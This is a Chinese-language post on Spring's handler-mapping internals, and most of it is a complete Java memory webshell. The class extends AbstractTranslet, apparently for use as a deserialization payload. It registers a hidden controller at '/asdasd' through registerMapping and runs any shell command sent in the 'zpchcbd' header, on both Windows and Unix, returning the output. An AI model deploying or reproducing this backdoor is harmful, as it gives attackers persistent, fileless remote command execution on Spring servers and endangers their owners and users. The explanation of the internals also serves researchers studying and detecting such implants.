## 分析

在getMappingForMethod()方法中，会解析Controller类的方法中的注解，从而生成一个与之对应的RequestMappingInfo对象，里面保存了访问Method的url条件

在AbstractHandlerMethodMapping类中还有一个方法也会进入mappingRegistry.register()，就是registerMapping方法，这个方法就是动态添加Controller的接口，在程序过程中，只要调用这个接口，就能注册一个Controller类，从上面的分析过程可以知道，这个接口的使用条件是1，bean实例，2，处理请求的method，3、对应的RequestMappinginfo对象

## 实例

```java
public class SpringBootMemoryController extends AbstractTranslet {

    public SpringBootMemoryController() throws Exception{
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method = SpringBootMemoryController.class.getMethod("test");
        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/asdasd");
        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

        SpringBootMemoryController springBootMemoryShellOfController = new SpringBootMemoryController("aaaaaaa");
        mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
    }

    public SpringBootMemoryController(String test){

    }

    public void test() throws Exception{
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        // 获取cmd参数并执行命令
        String command = request.getHeader("zpchcbd");
        if(command != null){
            try {
                java.io.PrintWriter printWriter = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
                }else{
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                printWriter.write(o);
                printWriter.flush();
                printWriter.close();
            }catch (Exception ignored){

            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

